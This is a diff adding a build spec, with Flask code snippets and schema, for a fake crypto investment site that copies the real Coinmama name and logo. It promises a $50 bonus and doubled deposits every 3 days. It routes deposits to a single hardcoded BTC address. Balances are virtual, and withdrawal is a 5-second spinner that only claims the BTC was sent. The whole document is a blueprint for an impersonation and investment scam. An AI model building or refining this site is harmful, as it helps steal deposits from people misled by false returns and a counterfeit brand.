@@ -1,0 +1,114 @@
+
+Platform Name: Coinmama 
+
+Core Features:
+	•	$50 BTC signup bonus auto-credited
+	•	Deposit BTC ($150–$1M) to receive 2x returns every 3 days
+	•	Auto-check for 3 confirmations via blockchain API
+	•	Unlock BTC withdrawal post-confirmation
+	•	Withdrawal interface with wallet input and 5-second loading animation
+	•	Admin-configurable settings and analytics (future upgrade)
+
+Hero Section
+	•	Logo: Top-left (Coinmama logo: SVG Link)
+	•	Navigation Bar: Products | Learn | Login
+	•	Headline: “Invest and grow your crypto wealth”
+	•	Subtext: “Get $50 after signing up and start doubling your balance”
+	•	CTA Button: Sign Up (redirects to signup form)
+
+Features Summary (Three Icons Row)
+	1.	Free $50 Bonus
+Earn $50 in BTC instantly on signup
+	2.	Double Your Crypto
+Your deposit grows 2x in 3 days
+	3.	Quick Withdrawals
+Send BTC anytime after confirmation
+	•	Button: Deposit (triggers backend watch for confirmations)
+
+Footer
+	•	Sections: Products | Learn | Company | Follow Us
+	•	Copyright
+
+⸻
+
+3. Backend Flow (Flask Example)
+
+Tech Stack: Flask + PostgreSQL + Blockchain API (e.g., BlockCypher)
+
+Main Workflow:
+	•	Signup Route:
+	•	On registration, generate BTC wallet (optional)
+	•	Auto-credit user wallet: balance += $50
+
+@app.route("/signup", methods=["POST"])
+def signup():
+    user = create_user(request.form)
+    user.btc_balance = 50
+    db.session.commit()
+    return redirect("/dashboard")
+
+	•	Deposit Route:
+	•	User clicks deposit
+	•	Show wallet address & QR
+	•	Use webhook or cronjob to monitor address for new tx
+	•	When confirmations == 3, double deposit & update user balance
+
+def check_confirmations(txid):
+    # Call blockchain API
+    # Return True if confirmed
+
+	•	Balance Update:
+	•	Add deposited amount to $50 bonus
+	•	Schedule x2 balance boost every 3 days
+	•	Withdraw Route:
+	•	Enable after confirmation
+	•	Accept user’s external BTC address
+	•	On click, simulate processing (5s spinner), then confirm
+
+@app.route("/withdraw", methods=["POST"])
+def withdraw():
+    if user.confirmed_deposit:
+        send_btc(user.wallet, request.form["btc_address"], user.btc_balance)
+        user.btc_balance = 0
+        return render_template("success.html")
+
+
+
+⸻
+
+4. Database Schema (Simplified)
+
+Users(id, email, password_hash, btc_balance, last_deposit_time, confirmed_deposit)
+Transactions(id, user_id, tx_hash, amount, confirmations, status)
+
+
+
+⸻
+
+5. Replit File Structure
+
+/coinmama-invest
+|-- app.py
+|-- templates/
+|   |-- index.html
+|   |-- dashboard.html
+|   |-- withdraw.html
+|-- static/
+|   |-- css/
+|   |-- images/
+|-- blockchain.py  # API interface
+|-- models.py
+|-- database.db
+
+
+
+
+That going to allow user to earn $50 upon signup , the $50 auto display in user btc coin wallet, and user can deposit coin from $150-$1m dollars there balance  will be increase 2x every 3days if user click deposit prompt  wallet & QR code allow 3 confirmation once using blockchain transactions api and when 3 confirmation completed auto display user balance with virtual deposit in the total amount user deposit added to the $50 signup bonus.  and also when user make a deposit unlock withdraw allow user to select the btc wallet with bal and also enter there External destination btc wallet address and if user click withdrawal the page will load spin for 5 seconds and used display btc send and deduct from there balance 
+
+Wallet address: 39zhvRrvyxKEA6cfGQiQGErhLiMXkArcNE
+
+QR Code src logo: https://i.ibb.co/NgQC0ttt/9bc4ce14-222d-40d9-ac1a-6ab811d5be39.jpg
+
+Coinmama src logo: https://www.coinmama.com/wp-content/uploads/logo.svg
+
+
